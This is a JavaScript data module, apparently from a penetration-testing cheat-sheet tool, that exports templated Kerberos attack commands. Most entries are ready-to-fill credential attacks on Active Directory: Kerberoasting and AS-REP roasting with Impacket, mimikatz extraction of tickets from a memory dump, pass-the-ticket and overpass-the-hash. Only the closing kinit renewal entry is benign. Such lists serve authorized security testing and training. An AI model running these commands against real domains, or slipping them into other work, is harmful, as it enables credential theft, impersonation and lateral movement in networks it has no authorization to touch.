export const kerberosCommands = {
    description: "Commands and techniques related to Kerberos authentication.",
    commands: [
        {
            name: "Kerberoasting (Impacket)",
            description: "Extract service tickets for all Kerberoastable accounts.",
            command: "GetUserSPNs.py {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}' -dc-ip {{DC_IP}} -request -outputfile kerberoast.hashes"
        },
        {
            name: "AS-REP Roasting",
            description: "Get hashes for accounts with Kerberos pre-authentication disabled.",
            command: "GetNPUsers.py {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}' -dc-ip {{DC_IP}} -request -format hashcat -outputfile asrep.hashes"
        },
        {
            name: "Ticket Granting Ticket (TGT) Extraction",
            description: "Extract TGT from memory.",
            command: "mimikatz 'sekurlsa::minidump dump.dmp' 'sekurlsa::tickets' 'exit'"
        },
        {
            name: "Pass-the-Ticket",
            description: "Use a valid TGT to impersonate a user.",
            command: "mimikatz 'kerberos::ptt ticket.kirbi'"
        },
        {
            name: "Overpass-the-Hash",
            description: "Obtain a TGT using NTLM hash.",
            command: "sekurlsa::pth /user:{{USERNAME}} /domain:{{DOMAIN}} /ntlm:{{NTLM_HASH}}"
        },
        {
            name: "Kerberos Ticket Renewal",
            description: "Renew a Kerberos ticket.",
            command: "kinit -R"
        }
    ]
};